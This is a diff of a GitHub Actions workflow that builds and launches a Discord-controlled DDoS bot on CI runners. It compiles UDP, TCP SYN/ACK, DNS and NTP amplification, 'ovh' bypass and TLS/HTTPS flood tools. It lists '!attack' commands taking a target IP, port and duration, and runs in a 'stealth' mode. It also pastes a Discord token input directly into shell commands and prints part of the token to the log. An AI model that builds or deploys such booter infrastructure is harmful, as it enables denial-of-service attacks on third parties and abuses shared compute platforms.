@@ -1,7 +1,12 @@
-name: BotL4&L7
+name: Bot L4 y L7
 
 on:
   workflow_dispatch:
+    inputs:
+      manual_token:
+        description: 'Token manual (opcional si KEYS está configurado)'
+        required: false
+        type: string
   push:
     branches:
       - main
@@ -9,6 +14,7 @@ on:
 jobs:
   build-and-run:
     runs-on: ubuntu-latest
+    
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
@@ -26,282 +32,195 @@ jobs:
       - name: Install Go dependencies
         run: |
           go mod init bot 2>/dev/null || true
-          go get github.com/sandertv/go-raknet 2>/dev/null || true
-          go get github.com/sirupsen/logrus 2>/dev/null || true
+          go get github.com/sandertv/go-raknet 2>/dev/null || echo "⚠️  go-raknet opcional"
+          go get github.com/sirupsen/logrus 2>/dev/null || echo "⚠️  logrus opcional"
 
       - name: Install Python dependencies
         run: |
           python -m pip install --upgrade pip
-          pip install -U discord.py
+          pip install discord.py
 
-      - name: Install build tools and libraries
+      - name: Install build tools
         run: |
           sudo apt-get update
           sudo apt-get install -y build-essential gcc g++ make libpcap-dev libssl-dev
-          echo "Herramientas instaladas"
 
-      - name: Build ALL binaries
+      - name: Build binaries
         run: |
-          echo "========================================"
-          echo "COMPILANDO TODOS LOS MÉTODOS"
-          echo "========================================"
+          echo "=== COMPILANDO BINARIOS ==="
           
-          # ========== MÉTODOS UDP ==========
-          echo ""
-          echo "🔧 COMPILANDO MÉTODOS UDP:"
-          
-          # udpbypass.c
-          if [ -f "udpbypass.c" ]; then
-            echo "  Compilando udpbypass.c → udpbypass"
-            gcc -O3 -pthread udpbypass.c -o udpbypass 2>/dev/null && {
-              chmod +x udpbypass
-              echo "    ✓ udpbypass listo"
-            } || echo "    ✗ Error udpbypass"
-          fi
-          
-          # udp.c (existente)
-          if [ -f "udp.c" ]; then
-            gcc -O3 -pthread -o udp udp.c 2>/dev/null && {
-              chmod +x udp
-              echo "    ✓ udp listo"
-            }
-          fi
-          
-          # udphex.c (existente)
-          if [ -f "udphex.c" ]; then
-            gcc -O3 udphex.c -o udphex 2>/dev/null && {
-              chmod +x udphex
-              echo "    ✓ udphex listo"
-            }
-          fi
-          
-          # udppps.c (existente)
-          if [ -f "udppps.c" ]; then
-            gcc -O3 udppps.c -o udppps 2>/dev/null && {
-              chmod +x udppps
-              echo "    ✓ udppps listo"
-            }
-          fi
-          
-          # ovh.c (existente)
-          if [ -f "ovh.c" ]; then
-            gcc -O3 -pthread ovh.c -o ovh -lpcap 2>/dev/null && {
-              chmod +x ovh
-              echo "    ✓ ovh listo"
-            } || {
-              # Intentar sin libpcap
-              gcc -O3 -pthread ovh.c -o ovh 2>/dev/null && {
-                chmod +x ovh
-                echo "    ✓ ovh listo (sin libpcap)"
-              } || echo "    ✗ Error ovh"
-            }
-          fi
-          
-          # udppayload.c (existente)
-          if [ -f "udppayload.c" ]; then
-            gcc -O3 -pthread udppayload.c -o udppayload 2>/dev/null && {
-              chmod +x udppayload
-              echo "    ✓ udppayload listo"
-            }
-          fi
-          
-          # ========== MÉTODOS TCP ==========
-          echo ""
-          echo "🔗 COMPILANDO MÉTODOS TCP:"
-          
-          # tcp.c
-          if [ -f "tcp.c" ]; then
-            echo "  Compilando tcp.c → tcp"
-            gcc -O3 -pthread tcp.c -o tcp 2>/dev/null && {
-              chmod +x tcp
-              echo "    ✓ tcp listo"
-            } || echo "    ✗ Error tcp"
-          fi
-          
-          # tcp-syn.c
-          if [ -f "tcp-syn.c" ]; then
-            echo "  Compilando tcp-syn.c → tcp-syn"
-            gcc -O3 -pthread tcp-syn.c -o tcp-syn -lpcap 2>/dev/null && {
-              chmod +x tcp-syn
-              echo "    ✓ tcp-syn listo"
-            } || {
-              gcc -O3 -pthread tcp-syn.c -o tcp-syn 2>/dev/null && {
-                chmod +x tcp-syn
-                echo "    ✓ tcp-syn listo (sin libpcap)"
-              } || echo "    ✗ Error tcp-syn"
-            }
-          fi
-          
-          # tcp-ack.c
-          if [ -f "tcp-ack.c" ]; then
-            echo "  Compilando tcp-ack.c → tcp-ack"
-            gcc -O3 -pthread tcp-ack.c -o tcp-ack -lpcap 2>/dev/null && {
-              chmod +x tcp-ack
-              echo "    ✓ tcp-ack listo"
-            } || {
-              gcc -O3 -pthread tcp-ack.c -o tcp-ack 2>/dev/null && {
-                chmod +x tcp-ack
-                echo "    ✓ tcp-ack listo (sin libpcap)"
-              } || echo "    ✗ Error tcp-ack"
-            }
-          fi
-          
-          # tcp-tls.c (necesita OpenSSL)
-          if [ -f "tcp-tls.c" ]; then
-            echo "  Compilando tcp-tls.c → tcp-tls"
-            gcc -O3 -pthread tcp-tls.c -o tcp-tls -lssl -lcrypto 2>/dev/null && {
-              chmod +x tcp-tls
-              echo "    ✓ tcp-tls listo"
-            } || echo "    ✗ Error tcp-tls (necesita libssl-dev)"
-          fi
-          
-          # ========== MÉTODOS AMP ==========
-          echo ""
-          echo "⚡ COMPILANDO MÉTODOS AMP:"
-          
-          # dns.c (dns-amp)
-          if [ -f "dns.c" ]; then
-            echo "  Compilando dns.c → dns"
-            gcc -O3 -pthread dns.c -o dns 2>/dev/null && {
-              chmod +x dns
-              echo "    ✓ dns listo"
-            } || echo "    ✗ Error dns"
-          fi
-          
-          # ntp.c (ntp-amp)
-          if [ -f "ntp.c" ]; then
-            echo "  Compilando ntp.c → ntp"
-            gcc -O3 -pthread ntp.c -o ntp 2>/dev/null && {
-              chmod +x ntp
-              echo "    ✓ ntp listo"
-            } || echo "    ✗ Error ntp"
-          fi
-          
-          # ========== MÉTODOS L7 ==========
-          echo ""
-          echo "🌐 COMPILANDO MÉTODOS L7:"
-          
-          # httpsraw.c
-          if [ -f "httpsraw.c" ]; then
-            echo "  Compilando httpsraw.c → httpsraw"
-            gcc -O3 -pthread httpsraw.c -o httpsraw 2>/dev/null && {
-              chmod +x httpsraw
-              echo "    ✓ httpsraw listo"
-            } || echo "    ✗ Error httpsraw"
-          fi
-          
-          # tls.c (tls-flood)
-          if [ -f "tls.c" ]; then
-            echo "  Compilando tls.c → tls"
-            gcc -O3 -pthread tls.c -o tls -lssl -lcrypto 2>/dev/null && {
-              chmod +x tls
-              echo "    ✓ tls listo"
-            } || {
-              # Versión simple sin OpenSSL
-              if [ -f "tls-simple.c" ]; then
-                gcc -O3 -pthread tls-simple.c -o tls 2>/dev/null && {
-                  chmod +x tls
-                  echo "    ✓ tls listo (versión simple)"
-                } || echo "    ✗ Error tls (ambas versiones fallaron)"
-              else
-                echo "    ✗ Error tls (necesita libssl-dev o tls-simple.c)"
-              fi
-            }
-          fi
-          
-          # httpsrequest.c
-          if [ -f "httpsrequest.c" ]; then
-            echo "  Compilando httpsrequest.c → httpsrequest"
-            gcc -O3 -pthread httpsrequest.c -o httpsrequest 2>/dev/null && {
-              chmod +x httpsrequest
-              echo "    ✓ httpsrequest listo"
-            } || echo "    ✗ Error httpsrequest"
-          fi
-          
-          # ========== RESULTADO FINAL ==========
-          echo ""
-          echo "========================================"
-          echo "📊 RESUMEN DE COMPILACIÓN"
-          echo "========================================"
-          echo "Ejecutables disponibles:"
-          
-          # Mostrar todos los binarios compilados
-          find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read bin; do
-            size=$(stat -c%s "$bin" 2>/dev/null || echo "?")
-            echo "  ✓ $(basename "$bin") (${size} bytes)"
-          done || echo "  No se compilaron ejecutables"
-          
-          echo ""
-          echo "Scripts Go disponibles:"
-          for script in udpflood.go raknet.go; do
-            if [ -f "$script" ]; then
-              echo "  ✓ $script"
+          # Función para compilar
+          compile_binary() {
+            local source="$1"
+            local binary="$2"
+            local libs="$3"
+            
+            if [ -f "$source" ]; then
+              echo "🔨 $source → $binary"
+              gcc -O3 -pthread "$source" -o "$binary" $libs 2>/dev/null && {
+                chmod +x "$binary"
+                echo "  ✅ $binary"
+              } || echo "  ⚠️  Error $binary"
             fi
-          done
+          }
           
-          echo "========================================"
+          # Compilar cada método
+          compile_binary "udpbypass.c" "udpbypass" ""
+          compile_binary "tcp.c" "tcp" ""
+          compile_binary "tcp-syn.c" "tcp-syn" "-lpcap"
+          compile_binary "tcp-ack.c" "tcp-ack" "-lpcap"
+          compile_binary "tcp-tls.c" "tcp-tls" "-lssl -lcrypto"
+          compile_binary "dns.c" "dns" ""
+          compile_binary "ntp.c" "ntp" ""
+          compile_binary "httpsraw.c" "httpsraw" ""
+          compile_binary "tls.c" "tls" "-lssl -lcrypto"
+          compile_binary "httpsrequest.c" "httpsrequest" ""
+          
+          # Métodos existentes
+          compile_binary "udp.c" "udp" ""
+          compile_binary "udphex.c" "udphex" ""
+          compile_binary "udppps.c" "udppps" ""
+          compile_binary "ovh.c" "ovh" "-lpcap"
+          compile_binary "udppayload.c" "udppayload" ""
+          
+          echo ""
+          echo "📂 Ejecutables compilados:"
+          find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" 2>/dev/null | sort
 
-      - name: Setup bot token
-        env:
-          KEYS: ${{ secrets.KEYS }}
+      - name: CONFIGURAR TOKEN (Múltiples fuentes)
+        id: setup_token
         run: |
-          if [ -z "$KEYS" ]; then
-            echo "ERROR: No se configuró el secret KEYS"
-            echo "Ve a Settings → Secrets and variables → Actions"
-            echo "Crea un secret llamado 'KEYS' con tu token de Discord"
+          echo "=== BUSCANDO TOKEN ==="
+          
+          # 1. Intentar desde secret KEYS
+          if [ -n "${{ secrets.KEYS }}" ]; then
+            echo "✅ Token encontrado en secret KEYS"
+            echo "${{ secrets.KEYS }}" > token.txt
+            echo "TOKEN_SOURCE=secret" >> $GITHUB_ENV
+            
+          # 2. Intentar desde input manual
+          elif [ -n "${{ github.event.inputs.manual_token }}" ]; then
+            echo "✅ Token encontrado en input manual"
+            echo "${{ github.event.inputs.manual_token }}" > token.txt
+            echo "TOKEN_SOURCE=manual" >> $GITHUB_ENV
+            
+          # 3. Verificar si token.txt ya existe
+          elif [ -f "token.txt" ] && [ -s "token.txt" ]; then
+            echo "✅ Usando token.txt existente"
+            echo "TOKEN_SOURCE=file" >> $GITHUB_ENV
+            
+          # 4. Error crítico
+          else
+            echo ""
+            echo "❌❌❌ ERROR: NO SE ENCONTRÓ TOKEN ❌❌❌"
+            echo ""
+            echo "SOLUCIONES:"
+            echo ""
+            echo "1. CONFIGURA SECRET EN GITHUB:"
+            echo "   • Ve a Settings → Secrets and variables → Actions"
+            echo "   • Crea un New repository secret"
+            echo "   • Nombre: KEYS"
+            echo "   • Valor: [TU TOKEN DE DISCORD]"
+            echo ""
+            echo "2. USA INPUT MANUAL:"
+            echo "   • Ejecuta workflow_dispatch"
+            echo "   • Pega tu token en 'manual_token'"
+            echo ""
+            echo "3. CREA token.txt MANUALMENTE:"
+            echo "   • Crea archivo token.txt en el repositorio"
+            echo "   • Escribe tu token dentro"
+            echo ""
             exit 1
           fi
           
-          echo "$KEYS" > token.txt
-          echo "✅ Token configurado desde secret KEYS"
+          # Verificar token
+          if [ -f "token.txt" ]; then
+            TOKEN_LENGTH=$(wc -c < token.txt)
+            echo "Token guardado en token.txt"
+            echo "Tamaño: $TOKEN_LENGTH caracteres"
+            
+            # Validar formato básico
+            if [ $TOKEN_LENGTH -lt 50 ]; then
+              echo "⚠️  Advertencia: Token muy corto (mínimo 59 caracteres)"
+            fi
+          fi
+
+      - name: VERIFICAR TOKEN
+        run: |
+          echo "=== VERIFICANDO TOKEN ==="
+          
+          if [ ! -f "token.txt" ]; then
+            echo "❌ ERROR: token.txt no se creó"
+            exit 1
+          fi
+          
+          TOKEN_CONTENT=$(cat token.txt)
+          TOKEN_LENGTH=${#TOKEN_CONTENT}
+          
+          echo "Token leído: $TOKEN_LENGTH caracteres"
+          echo "Primeros 5 chars: ${TOKEN_CONTENT:0:5}..."
+          
+          if [ $TOKEN_LENGTH -eq 0 ]; then
+            echo "❌ ERROR: Token vacío"
+            exit 1
+          fi
+          
+          echo "✅ Token verificado"
 
       - name: Run bot
         run: |
           echo "====================================="
-          echo "🤖 INICIANDO BOT CON TODOS LOS MÉTODOS"
+          echo "🚀 INICIANDO BOT UDP/TCP/AMP/L7"
           echo "====================================="
-          echo "Categorías disponibles:"
-          echo ""
-          echo "📡 L4 UDP PROTOCOL:"
-          echo "  !attack udp <ip> <puerto> <tiempo>"
-          echo "  !attack udphex <ip> <puerto> <tiempo>"
-          echo "  !attack udppps <ip> <puerto> <tiempo>"
-          echo "  !attack udpflood <ip> <puerto> <tiempo>"
-          echo "  !attack ovh <ip> <puerto> <tiempo>"
-          echo "  !attack udppayload <ip> <puerto> <tiempo> <payload>"
-          echo "  !attack raknet <ip> <puerto> <tiempo>"
-          echo "  !attack udpbypass <ip> <puerto> <tiempo>"
-          echo ""
-          echo "🔗 L4 TCP PROTOCOL:"
-          echo "  !attack tcp <ip> <puerto> <tiempo>"
-          echo "  !attack tcp-syn <ip> <puerto> <tiempo>"
-          echo "  !attack tcp-ack <ip> <puerto> <tiempo>"
-          echo "  !attack tcp-tls <ip> <puerto> <tiempo>"
-          echo ""
-          echo "⚡ AMP METHODS:"
-          echo "  !attack dns <ip> <puerto> <tiempo>"
-          echo "  !attack ntp <ip> <puerto> <tiempo>"
-          echo ""
-          echo "🌐 L7 METHODS:"
-          echo "  !attack httpsraw <ip> <puerto> <tiempo>"
-          echo "  !attack tls <ip> <puerto> <tiempo>"
-          echo "  !attack httpsrequest <ip> <puerto> <tiempo>"
-          echo ""
-          echo "📝 Usa: !methods para ver detalles"
-          echo "🔇 Modo sigiloso: ON (0 mensajes en Discord)"
-          echo "====================================="
+          echo "Fuente del token: ${{ env.TOKEN_SOURCE }}"
           echo ""
           
-          # Verificar archivos esenciales
+          # Verificar archivos críticos
           if [ ! -f "bot.py" ]; then
             echo "❌ ERROR: bot.py no encontrado"
             exit 1
           fi
           
           if [ ! -f "token.txt" ]; then
-            echo "❌ ERROR: token.txt no creado"
+            echo "❌ ERROR: token.txt no existe"
             exit 1
           fi
           
-          echo "✅ Iniciando bot..."
-          python bot.py
+          echo "✅ Archivos verificados"
+          echo "🎮 Métodos disponibles según ejecutables:"
+          
+          # Mostrar métodos disponibles
+          for method in udp udphex udppps ovh udppayload udpbypass tcp tcp-syn tcp-ack tcp-tls dns ntp httpsraw tls httpsrequest; do
+            if [ -f "$method" ]; then
+              echo "  ✓ $method"
+            fi
+          done
+          
+          for go_script in udpflood.go raknet.go; do
+            if [ -f "$go_script" ]; then
+              echo "  ✓ $go_script (Go)"
+            fi
+          done
+          
+          echo ""
+          echo "🔧 Compilando scripts Go..."
+          if [ -f "udpflood.go" ]; then
+            go build -o udpflood udpflood.go 2>/dev/null || echo "⚠️  udpflood.go"
+          fi
+          
+          if [ -f "raknet.go" ]; then
+            go build -o raknet raknet.go 2>/dev/null || echo "⚠️  raknet.go"
+          fi
+          
+          echo ""
+          echo "⚡ INICIANDO BOT..."
+          echo "Modo: Sigiloso (0 mensajes en Discord)"
+          echo "====================================="
+          
+          # Ejecutar bot
+          python3 bot.py
+          
+          echo ""
+          echo "====================================="
+          echo "🤖 BOT FINALIZADO"
+          echo "====================================="
